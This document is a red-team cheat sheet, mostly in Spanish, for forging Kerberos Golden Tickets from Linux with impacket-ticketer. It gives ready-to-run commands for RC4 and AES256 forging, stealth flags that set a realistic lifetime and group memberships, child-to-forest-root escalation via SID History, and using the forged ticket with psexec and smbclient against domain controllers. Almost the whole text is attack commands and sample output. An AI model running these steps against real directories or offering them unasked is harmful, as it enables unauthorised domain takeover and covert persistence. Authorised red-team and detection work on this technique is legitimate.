---
aliases:
  - Golden Ticket Linux
  - impacket-ticketer golden
tags:
  - technique/persistence
  - technique/kerberos
  - env/linux
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: SubCheatSheet
linked:
  - "[[Golden Ticket]]"
---

# Golden Ticket - Forging Linux

---

## impacket-ticketer — RC4 (básico)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer -nthash KRBTGT_NT -domain-sid SID -domain corp.local administrator` | Forge TGT como `administrator` | Standard — RC4. |
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local -user-id 500 administrator` | Forzar RID 500 | Coherencia con admin. |
| Output: `administrator.ccache` | ccache listo para `KRB5CCNAME` | Nombre = username del argumento. |
^gt-forge-rc4

```bash
impacket-ticketer \
  -nthash abc123KRBTGTHASH \
  -domain-sid S-1-5-21-1234567890-987654321-111222333 \
  -domain corp.local \
  administrator

# → administrator.ccache generado en CWD
export KRB5CCNAME=administrator.ccache
klist
```

---

## impacket-ticketer — AES256 (stealth)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer -aesKey AES256KEY -domain-sid SID -domain corp.local administrator` | Forge con AES256 — sin RC4 downgrade | OPSEC — dominio AES-only. |
| `impacket-ticketer -aesKey KEY -domain-sid SID -domain corp.local -user-id 500 -groups 513,512,520,518,519 administrator` | Full OPSEC con groups | Stealth máximo. |
^gt-forge-aes

```bash
impacket-ticketer \
  -aesKey def456AES256HASHHERE \
  -domain-sid S-1-5-21-1234567890-987654321-111222333 \
  -domain corp.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  administrator

export KRB5CCNAME=administrator.ccache
klist
```

---

## Flags avanzados

| **Flag** | **Valor** | **Efecto** |
|:---:|:---:|:---:|
| `-user-id <RID>` | `500` para administrator | Coherencia SID en PAC. |
| `-groups <list>` | `513,512,520,518,519` | DA + EA + Schema + Policy + Users. |
| `-extra-sid <SID-RID>` | `PARENT_SID-519` | SID History — acceso inter-domain. |
| `-duration <hours>` | `87600` (default 10 años) → `600` (25 días) | Lifetime del TGT. |
| `-spn <spn>` | `cifs/dc01.corp.local` | TGS directo (Silver Ticket mode). |
| `-ts` | flag | Timezone fix para some DCs. |
^gt-forge-flags

```bash
# OPSEC máximo — lifetime realista + AES + real user + real groups
impacket-ticketer \
  -aesKey AES256HASH \
  -domain-sid S-1-5-21-... \
  -domain corp.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  -duration 600 \
  administrator
```

---

## Cross-domain / SID History

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer ... -extra-sid PARENT_SID-519 administrator` | Agrega SID de Enterprise Admins del forest root al PAC | Escalar de child domain a forest root. |
| `-domain child.corp.local -domain-sid CHILD_SID` | Usar krbtgt del child domain | Child → Parent escalation. |
^gt-forge-crossdomain

```bash
# Escalada child → forest root via SID History
impacket-ticketer \
  -nthash CHILD_KRBTGT_HASH \
  -domain-sid S-1-5-21-CHILD-SID \
  -domain child.corp.local \
  -extra-sid S-1-5-21-PARENT-SID-519 \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc-root.corp.local
```

---

## Verificar ticket forjado

| **Comando** | **Qué muestra** | **Cuándo** |
|:---:|:---:|:---:|
| `klist` | Ticket en ccache — validity + service principal | Post-forge siempre. |
| `impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local` | Acceso SMB si ticket válido | Test rápido. |
^gt-forge-verify

```bash
export KRB5CCNAME=administrator.ccache
klist
# Credentials cache: FILE:administrator.ccache
# Default principal: administrator@CORP.LOCAL
# Valid starting    Expires           Service principal
# 05/03/26 ...     05/03/26 ...      krbtgt/CORP.LOCAL@CORP.LOCAL

# Test acceso
impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local
# smb: \> ls
```

---

## Output y conversión

| **Acción** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| Activar ccache | `export KRB5CCNAME=administrator.ccache` | Pre-uso. |
| Convertir a .kirbi | `impacket-ticketConverter administrator.ccache administrator.kirbi` | Para inyectar en Windows. |
| Usar con impacket | `impacket-psexec -k -no-pass corp/administrator@DC` | Post KRB5CCNAME. |
^gt-forge-output

---
